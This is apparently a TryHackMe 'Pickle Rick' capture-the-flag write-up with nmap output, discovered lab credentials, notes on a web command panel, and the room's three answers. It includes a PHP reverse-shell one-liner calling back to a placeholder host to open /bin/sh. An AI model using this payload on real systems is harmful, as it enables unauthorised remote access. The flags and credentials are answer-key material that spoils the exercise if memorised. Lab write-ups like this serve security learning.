TryHackMe.com

box = Pickle Rick

export IP = 10.10.122.220

# NMAP SCANS

```
# Nmap 7.60 scan initiated Fri Jan  8 10:22:53 2021 as: nmap -A -T4 -oN pickle-rick/nmap/NmapScans 10.10.122.220
Nmap scan report for ip-10-10-122-220.eu-west-1.compute.internal (10.10.122.220)
Host is up (0.00045s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:e7:eb:fb:3f:31:81:b3:35:f8:30:bd:0d:ed:eb:b6 (RSA)
|   256 bd:a3:bf:a5:e5:58:ac:d2:7a:84:56:29:a6:f5:d1:fd (ECDSA)
|_  256 98:32:ea:0d:28:77:0a:5e:81:c5:f3:77:d2:fd:a2:a4 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:E0:AE:8D:18:75 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/8%OT=22%CT=1%CU=43205%PV=Y%DS=1%DC=D%G=Y%M=02E0AE%TM
OS:=5FF83293%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=I%TS=8)
OS:SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=RD%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=
OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.45 ms ip-10-10-122-220.eu-west-1.compute.internal (10.10.122.220)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  8 10:23:15 2021 -- 1 IP address (1 host up) scanned in 22.72 seconds

```

# INTERESTING FINDS

```
- Wubbalubbadubdub (must be a password) (R1ckRul3s:Wubbalubbadubdub)
- gobuster mapped /login.php in web server
- command panel shows after logging in with the creds above.
- weird base64 hash in /portal.php source page (decoded: rabbit hole, nested base64, dont waste time like me.)
- /portal.php has command panel
- executed a reverse shell command in the /portal.php (command: php -r '$sock=fsockopen("YOUR_IP",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);')
- can use sudo
```


# TASKS

```
1. 1st ingredient?

- mr. meeseek hair

2. 2nd ingredient?

- 1 jerry tear

3. 3rd ingredient?

- fleeb juice
```    